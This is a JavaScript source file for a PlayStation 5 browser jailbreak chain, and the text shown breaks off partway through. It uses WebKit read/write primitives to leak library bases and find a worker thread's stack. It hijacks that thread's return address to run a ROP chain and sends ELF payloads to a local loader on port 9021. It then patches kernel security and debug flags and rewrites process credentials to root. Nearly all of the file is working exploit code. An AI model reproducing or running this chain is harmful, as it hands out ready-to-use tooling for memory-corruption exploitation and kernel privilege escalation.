if (!navigator.userAgent.includes("PlayStation 5")) {
  alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
  throw new Error("");
}

window.__repseq = 0;
window.__rep = function (tag, detail) {
  try {
    const t =
      String(tag) + (detail !== undefined && detail !== "" ? " " + detail : "");
    // Beacon RELATIVE, so it arrives as <site prefix>/log/REP-... on the host we
    // were served from. http.c matches "/log/" anywhere in the path, answers 204
    // and logs the URL, so every stage lands in run/host-live.log. The old
    // absolute :8088 target is not listening, so each beacon was a dead socket
    // wait on a timing-sensitive page.
    new Image().src =
      "log/REP-s" + (++window.__repseq) + "-" +
      encodeURIComponent(String(t)).slice(0, 900) + "?t=" + Date.now();
  } catch (e) {}
};
window.addEventListener("error", function (e) {
  try {
    __rep("WINDOW-ERROR", (e && e.message) || e);
  } catch (x) {}
});
window.addEventListener("unhandledrejection", function (e) {
  try {
    __rep(
      "UNHANDLED-REJECTION",
      String((e && e.reason && e.reason.message) || (e && e.reason) || e),
    );
  } catch (x) {}
});

// firmware.js has already detected the firmware and published window.fw_str,
// window.fw_float and the supported-version registry. See firmware.js to add one.

let nogc = [];

function build_addr(p, buf, family, port, addr) {
  p.write1(buf.add32(0x00), 0x10);
  p.write1(buf.add32(0x01), family);
  p.write2(buf.add32(0x02), port);
  p.write4(buf.add32(0x04), addr);
}

function htons(port) {
  return ((port & 0xff) << 8) | (port >>> 8);
}

function runtimeResolveThreadListRva(p, libKernelBase) {
  const view = new Uint8Array(0x40000);
  const viewPtr = p.leakval(view).add32(0x10);
  p.write8(viewPtr, libKernelBase);
  p.write4(viewPtr.add32(0x8), 0x40000);
  p.write4(viewPtr.add32(0xc), 0x1);
  nogc.push(view);

  const scanEnd = 0x40000;
  const sigs = [
    // lea rax,[rip+d]; mov r15,[rax]; test r15,r15
    { o: 0x48, n: 0x8d, op: 0x05, seq: [0x4c, 0x8b, 0x38, 0x4d, 0x85, 0xff] },
    // lea rax,[rip+d]; mov rax,[rax]; test rax,rax
    { o: 0x48, n: 0x8d, op: 0x05, seq: [0x48, 0x8b, 0x00, 0x48, 0x85, 0xc0] },
  ];

  const counts = new Map(); // rva -> { sites, disp, off }
  for (let off = 0; off + 7 + 6 <= scanEnd; off++) {
    if (view[off] !== 0x48 || view[off + 1] !== 0x8d || view[off + 2] !== 0x05)
      continue;
    let disp =
      view[off + 3] |
      (view[off + 4] << 8) |
      (view[off + 5] << 16) |
      (view[off + 6] << 24) |
      0;
    const tgtRva = off + 7 + disp;
    if (tgtRva < 0x1000 || tgtRva > 0x200000) continue;

    let matched = false;
    for (const s of sigs) {
      let ok = true;
      for (let i = 0; i < s.seq.length; i++) {
        if (view[off + 7 + i] !== s.seq[i]) {
          ok = false;
          break;
        }
      }
      if (ok) {
        matched = true;
        break;
      }
    }
    if (!matched) continue;

    const e = counts.get(tgtRva) || { sites: 0, disp, off };
    e.sites++;
    if (e.sites === 1) {
      e.disp = disp;
      e.off = off;
    }
    counts.set(tgtRva, e);
  }

  if (counts.size === 0) {
    throw new Error(
      "NO_STRICT_THREAD_LIST_SIG: libkernel_web has no `48 8d 05` " +
        "+ mov/test thread_list reference sequence (need a port of " +
        "OFFSET_lk__thread_list for fw " +
        String(window.fw_str) +
        ").",
    );
  }

  let best = null;
  for (const [rva, e] of counts) {
    if (!best || e.sites > best.e.sites) best = { rva, e };
  }
  // Consensus: the true symbol is referenced from several functions. A single
  // strict-sig hit could still be an unrelated global; require agreement or
  // fail loud (a wrong walk is a hard WebProcess crash, not a JS error).
  if (best.e.sites < 2) {
    throw new Error(
      "THREAD_LIST_SCAN_AMBIGUOUS: candidate rva 0x" +
        (best.rva >>> 0).toString(16) +
        " has only " +
        best.e.sites +
        " strict-matching site(s): " +
        Array.from(counts.entries())
          .map(([r, x]) => "0x" + (r >>> 0).toString(16) + "x" + x.sites)
          .join(", ") +
        ". Port OFFSET_lk__thread_list or hand-resolve it.",
    );
  }
  return { rva: best.rva, hits: best.e.sites };
}

function fingerprint_count(p, stack, expected) {
  // Locked worker: the top 4KB of its 0x80000 stack holds the saved return PC
  // into the libkernel wait loop (libKernelBase + OFFSET_lk_worker_wait_return).
  let count = 0;
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function find_worker(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  // a user pointer we are allowed to deref: canonical 48-bit user space,
  // 8-aligned, not the tiny/low stub pages. Everything garbage fails this.
  const plausible = (a) =>
    a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  let head;
  let headInfo = "offsets";
  if (typeof OFFSET_lk__thread_list !== "undefined") {
    head = libKernelBase.add32(OFFSET_lk__thread_list);
    __rep(
      "THREAD-LIST-PATH",
      "offsets rva=0x" + (OFFSET_lk__thread_list >>> 0).toString(16),
    );
  } else {
    // ?threadlist=0xHEX hard-override (fast lane once the value is known)
    const forced =
      (typeof window.AIO_CFG === "object" &&
        window.AIO_CFG !== null &&
        window.AIO_CFG.threadlist) ||
      (/threadlist=0x([0-9a-f]+)/i.exec(location.search) || [])[1] ||
      null;
    if (forced) {
      head = libKernelBase.add32(parseInt(forced, 16));
      headInfo = "config override";
      __rep(
        "THREAD-LIST-PATH",
        "override rva=0x" + (parseInt(forced, 16) >>> 0).toString(16),
      );
    } else {
      const r = runtimeResolveThreadListRva(p, libKernelBase);
      head = libKernelBase.add32(r.rva);
      headInfo = "runtime sig (" + r.hits + " agreeing sites)";
      __rep(
        "THREAD-LIST-PATH",
        "runtime rva=0x" + (r.rva >>> 0).toString(16) + " hits=" + r.hits,
      );
      if (typeof log === "function")
        log(
          "Runtime-resolved libkernel thread_list rva=0x" +
            (r.rva >>> 0).toString(16) +
            " [" +
            headInfo +
            "]" +
            " (hardcode as OFFSET_lk__thread_list when this proves out)",
          LogLevel.INFO,
        );
    }
  }

  // Pass 1: collect EVERY plausibility-gated 0x80000 stack. On a busy
  // SceShellUI there is more than one such thread; first-match picked a
  // non-worker, so the ROP write landed on a stack postMessage never wakes.
  const stacks = [];
  let steps = 0;
  for (
    let thread = p.read8(head);
    thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
      stacks.push(stack);
    // follow the *validated* link, not the raw list field
    thread = next;
  }
  if (stacks.length === 0) {
    __rep(
      "THREAD-LIST-WALK",
      "FAIL head=0x" + head.toString() + " steps=" + steps + " matches=0",
    );
    throw new Error(
      "failed to find worker. (libkernel thread_list @ 0x" +
        head.toString() +
        " via " +
        headInfo +
        "; scanned " +
        steps +
        " thread nodes)",
    );
  }
  if (typeof OFFSET_lk_worker_wait_return === "undefined") {
    // legacy profile without the wait-loop fingerprint: first candidate (old
    // behaviour, correct for profiles that predate the 13.xx multi-thread list)
    __rep(
      "THREAD-LIST-WALK",
      "legacy head=0x" +
        head.toString() +
        " steps=" +
        steps +
        " stacks=" +
        stacks.length +
        " pick=0x" +
        stacks[0].toString(),
    );
    return stacks[0];
  }

  // Pass 2: fingerprint-select. The rop_slave thread parks in the libkernel
  // message wait, so its stack top carries kbase+worker_wait_return. A
  // non-worker 0x80000 thread parks elsewhere and does not.
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((s) => fingerprint_count(p, s, expected) > 0);
    if (hits.length === 1) {
      __rep(
        "THREAD-FINGERPRINT",
        "stacks=" +
          stacks.length +
          " pick=0x" +
          hits[0].toString() +
          " expected=rva=0x" +
          (OFFSET_lk_worker_wait_return >>> 0).toString(16) +
          " attempt=" +
          attempt,
      );
      jbmark(
        "WORKER-FINGERPRINT",
        "pick=0x" + hits[0].toString() + " of " + stacks.length + " candidates",
      );
      return hits[0];
    }
    if (hits.length === 0) {
      // worker is still inside postMessage's dispatch epilogue; wait for it
      // to park again before judging the set.
      await new Promise((resolve) => setTimeout(resolve, 1));
      continue;
    }
    // multiple parked candidates are genuinely ambiguous; do not guess.
    __rep(
      "THREAD-FINGERPRINT",
      "AMBIGUOUS stacks=" +
        stacks.length +
        " hits=" +
        hits.map((s) => "0x" + s.toString()).join(",") +
        " expected=rva=0x" +
        (OFFSET_lk_worker_wait_return >>> 0).toString(16),
    );
    throw new Error(
      "worker-stack signature ambiguous: " +
        hits.length +
        "/" +
        stacks.length +
        " plausible 0x80000 stacks are parked at kbase+" +
        (OFFSET_lk_worker_wait_return >>> 0).toString(16),
    );
  }
  __rep(
    "THREAD-FINGERPRINT",
    "FAIL stacks=" +
      stacks.length +
      " expected=rva=0x" +
      (OFFSET_lk_worker_wait_return >>> 0).toString(16),
  );
  throw new Error(
    "no plausible 0x80000 stack parked at kbase+" +
      (OFFSET_lk_worker_wait_return >>> 0).toString(16) +
      " after retries (" +
      stacks.length +
      " candidates scanned)",
  );
}

async function find_worker_return_slot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  // The worker may answer immediately before returning to its idle wait.
  // The exact saved PC is the firmware-specific fingerprint. Do not require
  // the following qword to resemble an RSP: that adjacent slot is ABI/frame
  // layout dependent and 13.xx legitimately does not satisfy that heuristic.
  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      jbmark(
        "WORKER-RET-FINGERPRINT",
        "hit=0x" + hit.toString() + "-expected=0x" + expected.toString(),
      );
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(
    `worker wait return fingerprint count ${lastCount}, expected 1`,
  );
}

var LogLevel = {
  DEBUG: 0,
  INFO: 1,
  LOG: 2,
  WARN: 3,
  ERROR: 4,
  SUCCESS: 5,

  FLAG_TEMP: 0x1000,
};

let consoleElem = null;

function log(string, level) {
  if (consoleElem === null) {
    consoleElem = document.getElementById("console");
  }

  const isTemp = level & LogLevel.FLAG_TEMP;
  level = level & ~LogLevel.FLAG_TEMP;

  const elemClass = [
    "LOG-DEBUG",
    "LOG-INFO",
    "LOG-LOG",
    "LOG-WARN",
    "LOG-ERROR",
    "LOG-SUCCESS",
  ][level];


  consoleElem.innerHTML = "";

  const logElem = document.createElement("div");
  logElem.innerText = string;
  logElem.className = elemClass;
  consoleElem.appendChild(logElem);

  consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;

/* HARDPATH: firmwares with a hardware-proven full-chain run (13.xx only).
 *
 * Anything added to the SHARED path after a firmware's proving run is a change to code
 * that firmware never executed when it worked. For a proven firmware that is a
 * regression waiting to happen.
 *
 * fw      proven                                                    source
 * 13.00   devkit                                                   (TBD)
 * 13.xx   retail + devkit                                          WORKING.txt 2026-08-17
 * 13.40   devkit                                                   (TBD)
 * 13.xx   devkit                                                   (TBD)
 * 13.60   devkit                                                   (TBD)
 */
const HARDPATH_FW = {};
function isHardpath() {
  try {
    return !!HARDPATH_FW[String(window.fw_str)];
  } catch (e) {
    return false;
  }
}

// The rop_slave probe already had to go 4s -> 20s (93ea1b5) because this worker is
// genuinely slow on a cold run, so 8s was never a safe ceiling for it either.
const ROP_WAIT_MS = 20000;

var __TRACE = (function () {
  try {
    return /(^|[?&])log=debug(&|$)/.test(location.search);
  } catch (e) {
    return false;
  }
})();
function __rop(t) {
  if (!__TRACE) return;
  try {
    var x = new XMLHttpRequest();
    x.open(
      "GET",
      "log/ROP-" + encodeURIComponent(String(t)).slice(0, 180),
      false,
    );
    x.send();
  } catch (e) {}
}

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepare(p) {
  if (globalThis.__slopkitPrepared) {
    jbmark("PREP-REUSE", "reusing prepared p+chain (no new worker)");
    return globalThis.__slopkitPrepared;
  }

  let textArea = document.createElement("textarea");

  let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

  let textAreaVtable = p.read8(textAreaVtPtr);
  let libSceNKWebKitBase = null;
  const ctor = globalThis.__ps5NativeCtor;
  if (
    typeof OFFSET_wk_host_constructor_candidates !== "undefined" &&
    OFFSET_wk_host_constructor_candidates.length &&
    typeof ctor === "number"
  ) {
    for (const hc of OFFSET_wk_host_constructor_candidates) {
      const wb = ctor - hc;
      if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
        libSceNKWebKitBase = new int64(
          wb % 0x100000000,
          Math.floor(wb / 0x100000000),
        );
        jbmark(
          "WEBKIT-BASE-HC",
          "hc=0x" + hc.toString(16) + "-base=0x" + wb.toString(16),
        );
        break;
      }
    }
  }
  if (libSceNKWebKitBase === null)
    throw new Error(
      "no host-constructor candidate gave a valid base (ctor=0x" +
        ctor.toString(16) +
        ")",
    );

  let libSceLibcInternalBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
  );
  __rep("PREP-LIBS", "wk=0x" + libSceNKWebKitBase.toString());
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let libKernelBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
  );
  __rep("PREP-LIBS-KERNEL", "lk=0x" + libKernelBase.toString());
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  // once per run, before any racer exists
  jbmark(
    "MODULE-BASES",
    "wk=0x" +
      libSceNKWebKitBase.toString() +
      "-lk=0x" +
      libKernelBase.toString() +
      "-lc=0x" +
      libSceLibcInternalBase.toString(),
  );

  let gadgets = {};
  let syscalls = {};

  for (let gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (let sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  let nogc = [];

  function malloc_dump(sz) {
    let backing;
    backing = new Uint8Array(sz);
    nogc.push(backing);

    let ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc(sz, type = 4) {
    let backing;
    if (type == 1) {
      backing = new Uint8Array(1000 + sz);
    } else if (type == 2) {
      backing = new Uint16Array(0x2000 + sz);
    } else if (type == 4) {
      backing = new Uint32Array(0x10000 + sz);
    }
    nogc.push(backing);

    let ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function array_from_address(addr, size) {
    let og_array = new Uint8Array(1001);
    let og_array_i = p.leakval(og_array).add32(0x10);

    function setAddr(newAddr, size) {
      p.write8(og_array_i, newAddr);
      p.write4(og_array_i.add32(0x8), size);
      p.write4(og_array_i.add32(0xc), 0x1);
    }

    setAddr(addr, size);

    og_array.setAddr = setAddr;

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    let bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }

    let ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function readstr(addr, maxlen = -1) {
    let str = "";
    for (let i = 0; ; i++) {
      if (maxlen != -1 && i >= maxlen) {
        break;
      }
      let c = p.read1(addr.add32(i));
      if (c == 0x0) {
        break;
      }
      str += String.fromCharCode(c);
    }
    return str;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) {
          break;
        }
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0x0);
  }

  async function wait_for_worker() {
    return new Promise((resolve) => {
      worker.onmessage = function (e) {
        resolve(1);
      };
      worker.postMessage(0);
    });
  }

  let worker = new Worker("rop_slave.js");

  jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
  await wait_for_worker();
  jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

  let worker_stack = await find_worker(p, libKernelBase);
  __rep(
    "PREP-WORKER-STACK",
    "stack=0x" +
      worker_stack.toString() +
      " retslots=0x" +
      worker_stack.add32(OFFSET_WORKER_STACK_OFFSET).toString(),
  );
  jbmark(
    "PREP-WORKER-STACK",
    "stack=0x" +
      worker_stack.toString() +
      "-next=malloc(0x40)+worker_rop(0xC0000)",
  );
  let original_context = malloc(0x40);

  let return_address_ptr;
  if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
    return_address_ptr = await find_worker_return_slot(
      p,
      worker_stack,
      libKernelBase,
    );
  } else {
    // Backward-compatible path for original profiles without a saved-PC fingerprint.
    return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
  }
  let original_return_address = p.read8(return_address_ptr);
  let stack_pointer_ptr = return_address_ptr.add32(0x8);

  function pre_chain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  async function launch_chain(chain) {
    let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
    chain.push_write8(original_context, original_return_address);
    chain.push_write8(original_context.add32(0x10), return_address_ptr);
    chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
    chain.push(gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    if (window.jb && window.jb.hot)
      jbmark(
        "PREP-WILL-WRITE-RETADDR",
        "retptr=0x" +
          return_address_ptr.toString() +
          "-poprsp=0x" +
          gadgets["pop rsp"].toString() +
          "-rsp=0x" +
          chain.stack_entry_point.toString(),
      );

    p.write8(return_address_ptr, gadgets["pop rsp"]);
    p.write8(stack_pointer_ptr, chain.stack_entry_point);
    if (window.jb && window.jb.hot)
      __rep(
        "PREP-PIVOT-WRITE",
        "retptr=0x" +
          return_address_ptr.toString() +
          " rsp=0x" +
          chain.stack_entry_point.toString(),
      );
    // read the two slots back: proves the arbitrary write reached the worker stack

    if (window.jb && window.jb.hot)
      jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
    const hardpath = isHardpath();
    let p1 = await new Promise((resolve) => {
      let settled = false;
      worker.onmessage = function (e) {
        if (settled) return;
        settled = true;
        resolve(1);
      };
      if (!hardpath) {
        setTimeout(function () {
          if (settled) return;
          settled = true;
          __rop("ROP-TIMEOUT-worker-never-answered-" + ROP_WAIT_MS + "ms");
          resolve(-1);
        }, ROP_WAIT_MS);
      }
      worker.postMessage(0);
    });
    if (window.jb && window.jb.hot)
      jbmark(
        "CHAIN-POST-POST",
        "worker-answered-p1=" + p1 + "-hardpath=" + hardpath,
      );
    if (p1 == 0) {
      throw new Error("The rop thread ran away. ");
    }
    if (p1 < 0) {
      throw new Error(
        "the rop worker never answered in " +
          ROP_WAIT_MS / 1000 +
          "s - refusing to continue on a chain that never ran. (Reload.)",
      );
    }
  }

  let p2 = {
    write8: p.write8,
    write4: p.write4,
    write2: p.write2,
    write1: p.write1,
    read8: p.read8,
    read4: p.read4,
    read2: p.read2,
    read1: p.read1,
    leakval: p.leakval,
    pre_chain: pre_chain,
    launch_chain: launch_chain,
    malloc_dump: malloc_dump,
    malloc: malloc,
    stringify: stringify,
    array_from_address: array_from_address,
    readstr: readstr,
    writestr: writestr,
    libSceNKWebKitBase: libSceNKWebKitBase,
    libSceLibcInternalBase: libSceLibcInternalBase,
    libKernelBase: libKernelBase,
    nogc: nogc,
    syscalls: syscalls,
    gadgets: gadgets,
  };

  let chain = new worker_rop(p2);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
  p.write8(chain.return_value, JB_POISON);
  jbmark(
    "PREP-GETPID-PRE",
    "retval=0x" +
      chain.return_value.toString() +
      "-poisoned-next=chain.syscall(SYS_GETPID)",
  );

  let pid = await chain.syscall(SYS_GETPID);
  __rop("getpid raw=0x" + pid.toString());

  jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
    jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
    throw new Error(
      "The ROP chain never executed: the return slot still " +
        "holds the poison. The hijacked thread is not the one postMessage " +
        "wakes (main.js:69's worker vs this one), or the stack write did " +
        "not land.",
    );
  }

  if (pid.low == 0) {
    throw new Error("Webkit exploit failed.");
  }
  jbmark("PREP-GETPID-OK", "pid=" + pid.low);

  try {
    window.POOPS = {
      p: p2,
      chain: chain,
      int64: int64,
      toI64: function (x) {
        if (x && typeof x.low !== "undefined") return x;
        var b = typeof x === "bigint" ? x : BigInt(x >>> 0);
        return new int64(
          Number(b & 0xffffffffn),
          Number((b >> 32n) & 0xffffffffn),
        );
      },
      log:
        typeof log === "function"
          ? function (m) {
              log(m);
            }
          : function () {},
      jbmark: typeof jbmark === "function" ? jbmark : function () {},
      fw_str: window.fw_str,
      worker: worker,
      worker_stack: worker_stack,
    };
    jbmark("AIO-PUBLISHED", "gadgets=" + Object.keys(p2.gadgets || {}).length);
  } catch (e) {}

  return { p: p2, chain: chain };
}

async function main(userlandRW, wkOnly = false) {
  const debug = false;

  const { p, chain } = await prepare(userlandRW);
  if (debug) await log("Chain initialized", LogLevel.DEBUG);

  async function get_local_ips() {
    const SYSCALL_NETGETIFLIST = 0x07d;
    let ifaddr_count_buf = p.malloc(0x4);

    await chain.add_syscall_ret(ifaddr_count_buf, SYSCALL_NETGETIFLIST, 0, 10);
    await chain.run();

    let ifaddr_count = p.read4(ifaddr_count_buf);

    let if_addr_obj_size = 0x3c0;
    let if_addresses_length = if_addr_obj_size * ifaddr_count;
    let if_addresses = p.malloc(if_addresses_length);
    let ifaddrlist_ptr = if_addresses.add32(0x0);

    await chain.add_syscall(SYSCALL_NETGETIFLIST, ifaddrlist_ptr, ifaddr_count);
    await chain.run();

    let iplist = [];
    for (let i = 0; i < ifaddr_count; i++) {
      let adapterName = "";

      for (let i2 = 0; i2 < 16; i2++) {
        let char = p.read1(if_addresses.add32(if_addr_obj_size * i + i2));
        if (char == 0) {
          break;
        }
        adapterName += String.fromCharCode(char);
      }

      let ipAddress = "";

      for (let i2 = 40; i2 < 44; i2++) {
        ipAddress +=
          p.read1(if_addresses.add32(if_addr_obj_size * i + i2)).toString(10) +
          ".";
      }
      ipAddress = ipAddress.slice(0, -1);

      iplist.push({ name: adapterName, ip: ipAddress });
    }

    return iplist;
  }

  let ip_list = await get_local_ips();
  let ip = ip_list.find((obj) => obj.ip != "0.0.0.0");
  if (typeof ip === "undefined" || !ip.ip) {
    ip = { ip: "", name: "Offline" };
  }

  async function probe_sb_elfldr() {
    let fd =
      (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
    if (fd <= 0) return false;

    let addr = p.malloc(0x10, 1);
    build_addr(p, addr, AF_INET, htons(9021), 0x0100007f);
    let connect_res =
      (await chain.syscall(SYS_CONNECT, fd, addr, 0x10)).low << 0;
    await chain.syscall(SYS_CLOSE, fd);
    return connect_res >= 0;
  }

  let is_elfldr_running = await probe_sb_elfldr();
  await log("is elfldr running: " + is_elfldr_running, LogLevel.INFO);
  if (wkOnly && !is_elfldr_running) {
    let res = confirm(
      "elfldr doesnt seem to be running and in webkit only mode it wont be loaded, continue?",
    );
    if (!res) {
      throw new Error("Aborted");
    }
  }

  // Re-entry: an existing elfldr owns 9021, so never run the kernel exploit again.
  if (is_elfldr_running) {
    await log(
      "elfldr already running on 9021 -> skipping kernel exploit; sender-only mode",
      LogLevel.INFO,
    );
    wkOnly = true;
    window.__elfldrUp = true;
  } else if (wkOnly) {
    throw new Error(
      "Payload Sender requested, but elfldr is not listening on 127.0.0.1:9021. Run Jailbreak first.",
    );
  }


  var load_payload_into_elf_store_from_local_file = async function (filename) {
    await log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
    const response = await fetch("payloads/" + filename);
    if (!response.ok) {
      throw new Error(
        `Failed to fetch the binary file. Status: ${response.status}`,
      );
    }

    const data = await response.arrayBuffer();

    let byteArray;
    if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
      byteArray = new Uint8Array(data);
    } else if (elf_store.backing.BYTES_PER_ELEMENT == 2) {
      byteArray = new Uint16Array(data);
    } else if (elf_store.backing.BYTES_PER_ELEMENT == 4) {
      byteArray = new Uint32Array(data);
    } else {
      throw new Error(
        `Unsupported backing array type. BYTES_PER_ELEMENT: ${elf_store.backing.BYTES_PER_ELEMENT}`,
      );
    }

    elf_store.backing.set(byteArray);
    return byteArray.byteLength;
  };

  let SIZE_ELF_HEADER = 0x40;
  let SIZE_ELF_PROGRAM_HEADER = 0x38;
  var elf_store_size =
    SIZE_ELF_HEADER + SIZE_ELF_PROGRAM_HEADER * 0x10 + 0x1000000;
  var elf_store = p.malloc(elf_store_size, 1);

  // Shared sender for both fresh and re-entry sessions.
  const sendAddr = p.malloc(0x10, 1);
  window.__sendPayload = async function (filename) {
    const size = await load_payload_into_elf_store_from_local_file(filename);
    if (!size) throw new Error("payload is empty: " + filename);

    const sock =
      (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
    if (sock <= 0) throw new Error("socket() failed");

    build_addr(p, sendAddr, AF_INET, htons(9021), 0x0100007f);
    const rv =
      (await chain.syscall(SYS_CONNECT, sock, sendAddr, 0x10)).low << 0;
    if (rv < 0) {
      await chain.syscall(SYS_CLOSE, sock);
      throw new Error("elfldr is not listening on 127.0.0.1:9021");
    }

    let sent = 0;
    let ptr = elf_store.add32(0x0);
    while (sent < size) {
      const w =
        (await chain.syscall(SYS_WRITE, sock, ptr, size - sent)).low << 0;
      if (w <= 0) {
        await chain.syscall(SYS_CLOSE, sock);
        throw new Error("write failed after " + sent + " of " + size + " bytes");
      }
      sent += w;
      ptr.add32inplace(w);
    }
    await chain.syscall(SYS_CLOSE, sock);
    return sent;
  };

  // kexp handoff flag: true once aio -> kexp -> elfldr succeeded. Then the
  // kernel-side shellcode brought elfldr up on 9021 and the in-browser JIT
  // loader (9020) is skipped; payloads go to 9021 instead.
  let kexpElfldr = false;

  if (is_elfldr_running) {
    await log("existing elfldr confirmed; returning to payload sender", LogLevel.INFO);
    return;
  }

  if (!wkOnly) {
    var krw;
    if (typeof runAioExploit === "function") {
      krw = await runAioExploit(p, chain, log);
    } else {
      try {
        const aio = await import("./exploit.js");
        krw = await aio.runKernelExploit(p, chain, log);
      } catch (e) {
        if (typeof runUmtx2Exploit === "function") {
          krw = await runUmtx2Exploit(p, chain, log);
        } else {
          throw new Error(
            "no kernel exploit module loaded (exploit.js import failed: " +
              e +
              ")",
          );
        }
      }
    }

    // The exploit module runs the entire chain itself -- escalation, the
    // kexp handoff, teardown -- and signals done:true so we do NOT run the
    // legacy kernel-patch tail below (its .data writes are unverified here).
    if (krw && krw.done) {
      window.__elfldrUp = !!krw.elfldr;

      await log(
        krw.elfldr
          ? "kernel chain complete; elfldr is up on 127.0.0.1:9021"
          : "kernel chain complete; elfldr was not confirmed (see the log above)",
        LogLevel.INFO,
      );
      return;
    }

    if (!krw || typeof krw.read4 !== "function" || !krw.ktextBase) {
      await log(
        "kernel exploit returned without kernel R/W -- stopping clean",
        LogLevel.INFO,
      );
      return;
    }

    function get_kaddr(offset) {
      return krw.ktextBase.add32(offset);
    }

    let security_flags = await krw.read4(
      get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS),
    );
    await krw.write4(
      get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS),
      security_flags | 0x14,
    );

    await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);

    let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
    await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);

    let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
    await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
    await log("Enabled debug menu", LogLevel.INFO);

    let cur_uid = await chain.syscall(SYS_GETUID);
    await log(
      "Escalating creds... (current uid=0x" + cur_uid + ")",
      LogLevel.INFO,
    );

    await krw.write4(krw.procUcredAddr.add32(0x04), 0);
    await krw.write4(krw.procUcredAddr.add32(0x08), 0);
    await krw.write4(krw.procUcredAddr.add32(0x0c), 0);
    await krw.write4(krw.procUcredAddr.add32(0x10), 1);
    await krw.write4(krw.procUcredAddr.add32(0x14), 0);

    await krw.write8(
      krw.procUcredAddr.add32(0x58),
      new int64(0x00000013, 0x48010000),
    );
    await krw.write8(
      krw.procUcredAddr.add32(0x60),
      new int64(0xffffffff, 0xffffffff),
    );
    await krw.write8(
      krw.procUcredAddr.add32(0x68),
      new int64(0xffffffff, 0xffffffff),
    );
    await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);

